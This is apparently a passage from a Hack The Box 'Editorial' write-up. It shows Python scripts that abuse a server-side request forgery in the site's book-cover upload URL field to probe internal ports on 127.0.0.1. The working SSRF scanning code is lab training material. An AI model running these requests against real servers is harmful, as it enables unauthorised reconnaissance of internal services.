Foothold

Take a look at the request send from target server using burpsuite, we can see "jpeg" file on the response. This response may change when we send request to other port.

To explore open port on target machine, we use this response.

We set the variable 'bookurl' with '127.0.0.1:80', which is common port. Like response to our request we sent before, it include jpeg file in response.

Other valid open ports may respond in other way. Let's observe response to the request to common http ports.

I wrote a code which send requests to common http ports, and show us whether it includes jpeg file in response.

import requests

common_http_ports = [
    80,     # HTTP
    443,    # HTTPS
    8080,   # Common HTTP proxy / dev server
    8000,   # Dev servers (Python, Ruby, Node.js, etc.)
    8443,   # HTTPS alternate
    8888,   # Jupyter, other dev tools
    5000,   # Flask, dev APIs
    3000,   # React, Node, dev frontend
    8081,   # HTTP alternate
    7000,   # Internal dashboards
    9090,   # Prometheus, web UIs
    8181,   # Admin panels
    10000,  # Webmin, NAS, router UIs
    49152,  # Dynamic port (common for Docker/containers)
    5601,   # Kibana
    9200,   # Elasticsearch
    5985,   # WinRM HTTP
    5986    # WinRM HTTPS
]

url = "http://editorial.htb/upload-cover"

files = {
    "bookfile": ("", b"", "application/octet-stream")
}
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Referer": "http://editorial.htb/upload"
}

for i in common_http_ports:
    bookurl = f"http://127.0.0.1:{i}"
    data = {
        "bookurl" : bookurl
    }
    response = requests.post(url, data=data, files=files, headers=headers)
    print("-------------------------------------------")
    print(i)
    print("Status:", response.status_code)
    print("Response:", response.text[:300])

As you can see, there is no new information. All responses include a jgep file. We may need to check other ports which is not for HTTP and common in HTB.

Also, make it doubly sure to work this request fuzzer, we fetch empty bookfile to the request.

import requests

htb_common_ports = [
    21, 22, 25, 53, 69, 80, 111, 139, 1433, 2049, 3306, 3389,
    443, 445, 5000, 5432, 5985, 5986, 6379, 8080, 8443,
    8888, 27017, 389, 631, 873, 8000, 3000
]


with open("empty.jpg", 'wb') as f:
    f.write(b'')

for i in htb_common_ports:
    try:
        with open("empty.jpg", 'rb') as f:
            payload = {
                "bookurl": f"http://127.0.0.1:{i}"
            }
            files = {
                "bookfile": f
            }

            response = requests.post("http://editorial.htb/upload-cover",
                                     data=payload, files=files, timeout=3)
            print(f"Sent payload to port number.{i}")

            if not response.text.strip().endswith('.jpeg'):
                print(f"[+] Port {i} returned different content:")
                print(response.text[:200])

    except requests.RequestException as err:
        print(f"[-] Error on port {i}: {err}")
